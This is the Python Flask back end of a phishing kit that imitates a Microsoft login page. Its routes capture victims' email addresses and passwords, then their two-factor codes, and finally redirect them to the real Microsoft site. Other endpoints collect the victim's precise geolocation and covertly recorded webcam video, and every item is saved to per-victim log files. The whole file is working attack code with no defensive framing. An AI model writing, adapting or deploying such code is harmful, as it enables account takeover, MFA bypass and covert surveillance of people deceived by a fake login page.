from flask import Flask, render_template, request, redirect, jsonify, url_for
import os
import json
from datetime import datetime
import logging
import traceback
import base64

# Disable Werkzeug logger to prevent request logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

# Ensure directories exist
os.makedirs('logs', exist_ok=True)
os.makedirs('uploads', exist_ok=True)

# Dictionary to store user session data
user_sessions = {}

@app.route('/')
def index():
    logger.info('\033[92m[+] User visited the login page\033[0m')
    return render_template('index.html')

@app.route('/microsoft/password', methods=['GET'])
def password():
    email = request.args.get('email', '')
    return render_template('password.html')

@app.route('/microsoft/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data.get('email', '')
        password = data.get('password', '')
        
        # Log to console with colors
        logger.info(f'\033[91m[!] LOGIN CAPTURED - Email: {email} - Password: {password}\033[0m')
        
        # Initialize or update user session data
        if email not in user_sessions:
            user_sessions[email] = {
                'email': email,
                'timestamp': datetime.now().isoformat(),
                'password': password
            }
        else:
            user_sessions[email]['password'] = password
        
        # Save data to a single log file named after the email
        save_user_session(email)
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Error in login: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/microsoft/verify', methods=['GET'])
def verify_page():
    email = request.args.get('email', '')
    return render_template('verify.html')

@app.route('/microsoft/verify', methods=['POST'])
def verify():
    try:
        # Handle both JSON and form data
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        email = data.get('email', '')
        code = data.get('code', '')
        
        # Log to console with colors - removed redundant email
        logger.info(f'\033[91m[!] 2FA CAPTURED - Code: {code}\033[0m')
        
        # Update user session data
        if email in user_sessions:
            user_sessions[email]['verification_code'] = code
            user_sessions[email]['verified_at'] = datetime.now().isoformat()
        
        # Save updated data
        save_user_session(email)
        
        return jsonify({"status": "success", "redirect": "https://www.microsoft.com"}), 200
    except Exception as e:
        logger.error(f"Error in verify: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/microsoft/success')
def success():
    logger.info('\033[92m[+] User completed authentication successfully!\033[0m')
    return render_template('success.html')

@app.route('/save-location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        location = data.get('location', {})
        
        # إنشاء رابط خرائط جوجل للموقع الدقيق
        latitude = location.get("latitude")
        longitude = location.get("longitude")
        accuracy = location.get("accuracy", 0)
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}&z=17"
        
        # سجل في وحدة التحكم رابط خرائط جوجل فقط
        logger.info(f'\033[91m[!] LOCATION CAPTURED - Google Maps: {google_maps_link}\033[0m')
        
        # لا يمكن تحديد البريد الإلكتروني في هذه المرحلة، لذا نقوم بتخزين معلومات الموقع للاستخدام لاحقًا
        session_id = request.cookies.get('session_id', 'unknown')
        location_data = {
            'location': location,
            'google_maps_link': google_maps_link,
            'captured_at': datetime.now().isoformat()
        }
        
        # تخزين بيانات الموقع مؤقتًا
        app.config['LOCATION_DATA'] = location_data
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Error saving location: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/save-video', methods=['POST'])
def save_video():
    try:
        data = request.get_json()
        video_data = data.get('video', '')
        email = data.get('email', '')
        
        # Remove the data URL prefix to get the base64 data
        if ',' in video_data:
            video_data = video_data.split(',')[1]
        
        # If we have an email, save the video with that reference
        if email and email in user_sessions:
            # Decode base64 data
            video_bytes = base64.b64decode(video_data)
            
            # Save the video file
            video_filename = f'uploads/captured_video_{email.replace("@", "_at_")}.webm'
            
            with open(video_filename, 'wb') as f:
                f.write(video_bytes)
            
            # Update the user session with video information
            user_sessions[email]['video_filename'] = video_filename
            user_sessions[email]['video_captured_at'] = datetime.now().isoformat()
            
            # Save updated user session
            save_user_session(email)
            
            logger.info(f'\033[91m[!] VIDEO CAPTURED - Saved for: {email}\033[0m')
        else:
            # If no email, save with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            video_bytes = base64.b64decode(video_data)
            video_filename = f'uploads/captured_video_{timestamp}.webm'
            
            with open(video_filename, 'wb') as f:
                f.write(video_bytes)
            
            logger.info(f'\033[91m[!] VIDEO CAPTURED - Saved as: {video_filename}\033[0m')
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Error saving video: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/static/<path:path>')
def send_static(path):
    return app.send_static_file(path)

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store'
    return response

def save_user_session(email):
    """Save user session data to a single file named after the email."""
    if email in user_sessions:
        # Use sanitized email as filename
        safe_email = email.replace('@', '_at_').replace('.', '_dot_')
        filename = f'logs/{safe_email}.json'
        
        # Check if we have location data and add it to user session
        if hasattr(app.config, 'LOCATION_DATA') and app.config.get('LOCATION_DATA'):
            user_sessions[email]['location'] = app.config.get('LOCATION_DATA')
            # Clear the temporary storage
            app.config['LOCATION_DATA'] = None

        # Save to file
        with open(filename, 'w') as f:
            json.dump(user_sessions[email], f, indent=4)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=50005, debug=False) 